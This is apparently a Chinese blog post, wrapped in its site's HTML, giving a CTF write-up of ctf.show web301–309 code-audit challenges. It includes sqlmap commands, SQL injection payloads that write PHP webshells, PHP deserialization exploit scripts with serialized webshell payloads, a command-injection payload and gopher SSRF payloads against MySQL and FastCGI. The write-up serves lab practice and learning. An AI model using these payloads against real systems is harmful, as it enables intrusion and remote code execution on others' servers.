@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web301-web310代码审计</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/09/17 17:37:11</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="web301-302"><a href="#web301-302" class="headerlink" title="web301-302"></a>web301-302</h1><p>上来就是登录页面，看了代码发现没有过滤，尝试使用sqlmap直接开注入。</p>
+<pre class="language-none"><code class="language-none">$sql&#x3D;&quot;select sds_password from sds_user where sds_username&#x3D;&#39;&quot;.$username.&quot;&#39; order by id limit 1;&quot;;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692710578502-cd8b5cd9-289d-4d3a-9320-2ac09591e7d5.png" alt="image.png"></p>
+<pre class="language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;e870d81c-dd88-4dc4-b990-760221d286bb.challenge.ctf.show&#x2F;checklogin.php --data &#39;userid&#x3D;1&amp;userpwd&#x3D;1&#39; -D sds -C sds_password --dump --batch</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712050115-fbdbfe16-279c-4760-924d-8f3686d25747.png" alt="image.png"><br>看看密码，sqlmap这个必须盲注，只盲了密码，猜账号为admin。<br>登陆成功。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712078604-99fbc469-4f7b-41d5-9bce-b007a63bbaa8.png" alt="image.png"><br>但是登录进入之后没啥用，似乎得写入shell。<br>之前还真没怎么用过sql写文件，这里记一下：</p>
+<pre class="language-none"><code class="language-none">userid&#x3D;1&#39;+union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&quot;--+&amp;userpwd&#x3D;1</code></pre>
+<p>然后直接rce即可。</p>
+<h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p>这回写不进去了，返回了一串字符。继续读代码。<br>账号估计还是<code>admin</code>，但是sqlmap进不去了，那就尝试爆破一下，真进去了还，密码就是admin。（在sql文件中有登录密码的md5的值，可以去找破解）<br>dptadd.php中有更新语句。</p>
+<pre class="language-none"><code class="language-none">$sql&#x3D;&quot;insert into sds_dpt set sds_name&#x3D;&#39;&quot;.$dpt_name.&quot;&#39;,sds_address &#x3D;&#39;&quot;.$dpt_address.&quot;&#39;,sds_build_date&#x3D;&#39;&quot;.$dpt_build_year.&quot;&#39;,sds_have_safe_card&#x3D;&#39;&quot;.$dpt_has_cert.&quot;&#39;,sds_safe_card_num&#x3D;&#39;&quot;.$dpt_cert_number.&quot;&#39;,sds_telephone&#x3D;&#39;&quot;.$dpt_telephone_number.&quot;&#39;;&quot;;</code></pre>
+<p>在dpt_name里面插入语句。<br>post：</p>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select 1)#</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692715850916-55750a4a-3948-4e0d-bb90-00b79ec1eae4.png" alt="image.png"><br>依次查询即可。</p>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</code></pre>
+<blockquote>
+<p>sds_dpt,sds_fl9g,sds_user</p>
+</blockquote>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;sds_fl9g&quot;)#</code></pre>
+<blockquote>
+<p>flag</p>
+</blockquote>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select flag from sds_fl9g)#</code></pre>
+<h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>有了waf</p>
+<pre class="language-none"><code class="language-none">function sds_waf($str)&#123;
+	return preg_match(&#39;&#x2F;[0-9]|[a-z]|-&#x2F;i&#39;, $str);
+&#125;</code></pre>
+<p>但是似乎上面的payload也是可以的。</p>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;, sds_address&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())--+</code></pre>
+<pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;, sds_address&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;sds_flaag&quot;)--+</code></pre>
+<h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p>密码还是相同的，先看一眼waf：</p>
+<pre class="language-php" data-language="php"><code class="language-php">function sds_waf($str)&#123;
+  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\&quot;|\,|\.|\?|\&#x2F;|\\\|\&lt;|\&gt;&#x2F;&#39;, $str))&#123;
+    return false;
+  &#125;else&#123;
+    return true;
+  &#125;
+&#125;</code></pre>
+<p>注入感觉不太行，换个思路。<br>class.php里面似乎有反序列化漏洞。</p>
+<pre class="language-php" data-language="php"><code class="language-php">class user&#123;
+	public $username;
+	public $password;
+	public function __construct($u,$p)&#123;
+		$this-&gt;username&#x3D;$u;
+		$this-&gt;password&#x3D;$p;
+	&#125;
+	public function __destruct()&#123;
+		file_put_contents($this-&gt;username, $this-&gt;password);
+	&#125;
+&#125;
+</code></pre>
+<p>再找他的注入点：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692776440370-d18b7389-60e4-4c78-a4c1-c9fdbfc084a3.png" alt="image.png"><br>在checklogin.php里面，那我们直接写一个shell进去。这里需要url编码。</p>
+<pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; new user(&#39;1.php&#39;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);
+echo urlencode(serialize($a));</code></pre>
+<p>加入到cookie里面。</p>
+<pre class="language-php" data-language="php"><code class="language-php">user&#x3D;O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A23%3A%22%3C%3Fphp+eval%28%24_GET%5B1%5D%29%3B%3F%3E%22%3B%7D</code></pre>
+<p>写了shell之后发现里面没有flag文件，那估计就是在数据库中。<br>用蚁剑连接数据库，密码是root，弱口令。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692780896651-ce25991e-b502-4cb3-bb5b-ca641e6b0557.png" alt="image.png"></p>
+<h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>还是反序列化</p>
+<pre class="language-php" data-language="php"><code class="language-php">class log&#123;
+	public $title&#x3D;&#39;log.txt&#39;;
+	public $info&#x3D;&#39;&#39;;
+	public function loginfo($info)&#123;
+		$this-&gt;info&#x3D;$this-&gt;info.$info;
+	&#125;
+	public function close()&#123;
+		file_put_contents($this-&gt;title, $this-&gt;info);
+	&#125;
+
+&#125;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783099271-9c0ed153-1fea-4ee8-995b-57a3c3dc502e.png" alt="image.png"><br>查询之后发现有一个调用close方法的位置。</p>
+<pre class="language-php" data-language="php"><code class="language-php">class dao&#123;
+	private $config;
+	private $conn;
+
+	public function __destruct()&#123;
+		$this-&gt;conn-&gt;close();
+	&#125;</code></pre>
+<p>index里面包含了需要的文件。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783481714-0b44c2cf-10f0-4c57-af3b-0e0e162e724d.png" alt="image.png"><br>写一下exp：<br>注意这以下都是错的！！！！</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+class dao
+&#123;
+    private $config;
+    &#x2F;&#x2F; 注意private 先改后修吧
+    public $conn;
+
+    public function __destruct()
+    &#123;
+        $this-&gt;conn-&gt;close();
+    &#125;
+&#125;
+
+class log&#123;
+    public $title&#x3D;&#39;log.txt&#39;;
+    public $info&#x3D;&#39;&#39;;
+    public function loginfo($info)&#123;
+        $this-&gt;info&#x3D;$this-&gt;info.$info;
+    &#125;
+    public function close()&#123;
+        file_put_contents($this-&gt;title, $this-&gt;info);
+    &#125;
+
+&#125;
+$b &#x3D; new log();
+$b-&gt;title &#x3D; &#39;1.php&#39;;
+$b-&gt;info &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
+$a &#x3D; new dao();
+$a-&gt;conn &#x3D; $b;
+echo urlencode(serialize($a));</code></pre>
+<p>得到：</p>
+<pre class="language-php" data-language="php"><code class="language-php">O%3A3%3A%22dao%22%3A2%3A%7Bs%3A11%3A%22%00dao%00config%22%3BN%3Bs%3A4%3A%22conn%22%3BO%3A3%3A%22log%22%3A2%3A%7Bs%3A5%3A%22title%22%3Bs%3A5%3A%221.php%22%3Bs%3A4%3A%22info%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D%7D
+修改public为private，并且修改字符个数
+O%3A3%3A%22dao%22%3A2%3A%7Bs%3A11%3A%22%00dao%00config%22%3BN%3Bs%3A9%3A%22%00dao%00conn%22%3BO%3A3%3A%22log%22%3A2%3A%7Bs%3A5%3A%22title%22%3Bs%3A5%3A%221.php%22%3Bs%3A4%3A%22info%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D%7D
+再套一层base64</code></pre>
+<p>这以上都是错的<br>妈的 那个base64之前不需要url转义，而且有更好的写法，利用construct构造方法解决：<br>新的exp：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class dao&#123;
+	private $conn;
+
+	public function __construct()&#123;
+		$this-&gt;conn&#x3D;new log();
+	&#125;
+&#125;
+class log&#123;
+	public $title&#x3D;&#39;a.php&#39;;
+	public $info&#x3D;&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
+&#125;
+$a&#x3D;new dao();
+echo base64_encode(serialize($a));
+</code></pre>
+<p>擦，卡在了密码这半小时，密码是<code>admin1</code>，仔细读了一下代码，发现多层md5加密，而且有salt，因此应该是弱口令爆破出来。研究了半天hashcat。</p>
+<h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p>直接上cnseay，一键审计。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926443971-a06d0593-19be-4cb4-bf93-27dc36a331f5.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926518010-4273905e-a413-4f6e-9968-494658b6560c.png" alt="image.png"><br>第二个直接用分号隔断进行命令执行即可。<br>构造一下内容，写个马。</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class config&#123;
+    public $cache_dir &#x3D; &#39;;echo &quot;&lt;?php system($_POST[1]); ?&gt;&quot; &gt; 1.php;&#39;;
+&#125;
+
+class dao&#123;
+    private $config;
+    public function __construct()
+    &#123;
+        $this-&gt;config &#x3D; new config();
+    &#125;
+&#125;
+
+echo base64_encode(serialize(new dao()));
+</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjtlY2hvICI8P3BocCBzeXN0ZW0oJF9QT1NUWzFdKTsgPz4iID4gMS5waHA7Ijt9fQ</code></pre>
+<p>我们这里激活点用的是：logout下的，因此注意生成马的相对路径前也有个controller<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694927480974-575e9f4d-bcdc-4475-9bcb-da89a43c285a.png" alt="image.png"><br>测了，校园网传不上去payload。直接写入读一下吧。</p>
+<h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><h3 id="SSRF打mysql"><a href="#SSRF打mysql" class="headerlink" title="SSRF打mysql"></a>SSRF打mysql</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122510390">https://blog.csdn.net/qq_42880719&#x2F;article&#x2F;details&#x2F;122510390</a></p>
+</blockquote>
+<p>我合计还用原来的写法，前后拼接一下，应该还能用，但是wp用了ssrf。正好没接触过，学一下。</p>
+<blockquote>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+</blockquote>
+<p>通过gopherus生成payload来打mysql<br>利用点在：</p>
+<pre class="language-php" data-language="php"><code class="language-php">function checkUpdate($url)&#123;
+		$ch&#x3D;curl_init();
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_HEADER, false);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+		$res &#x3D; curl_exec($ch);
+		curl_close($ch);
+		return $res;
+	&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">Give MySQL username: root
+Give query to execute: select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694929570468-2704a7e4-7a92-4c63-bbb9-e5f479587b22.png" alt="image.png"><br>poc：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+class config&#123;
+    public $update_url &#x3D; &#39;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#39;;
+&#125;
+
+class dao&#123;
+    private $config;
+    public function __construct()&#123;
+        $this-&gt;config &#x3D; new config();
+    &#125;
+&#125;
+
+echo base64_encode(serialize(new dao()));
+&#x2F;&#x2F;TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjA6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDUlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlMDElMDAlMDAlMDAlMDEiO319
+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694930006097-a4bea450-bf23-4cf0-9c25-36c2a0e97031.png" alt="image.png"><br>爆破进去。<br>然后再index.php页面cookie中传入service中传入需要的payload即可。<br>然后访问1.php传参获取flag即可。</p>
+<h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><h3 id="SSRF打fastcgi"><a href="#SSRF打fastcgi" class="headerlink" title="SSRF打fastcgi"></a>SSRF打fastcgi</h3><p>这根本不会，直接超wp</p>
+<blockquote>
+<p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程<br>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p>
+</blockquote>
+<blockquote>
+<p>探测是通过gopher协议的延迟判断的<br>gopher:&#x2F;&#x2F;127.0.0.1:9000<br>通过http或其他协议去探测内网，如果ip存活则短延迟(不管端口开没开)，如果ip不存在则长延迟</p>
+</blockquote>
+<p>php-fpm</p>
+<blockquote>
+<p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程</p>
+<p>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p>
+</blockquote>
+<p>假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行<br>还是gopherus这个工具</p>
+<pre class="language-php" data-language="php"><code class="language-php">Give one file name which should be surely present in the server (prefer .php file)
+if you don&#39;t know press ENTER we have default one:  index.php
+Terminal command to run:  cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f* &gt; flag.txt</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694931120245-d9009d25-d5ae-46ed-8b4d-88f63969465b.png" alt="image.png"></p>
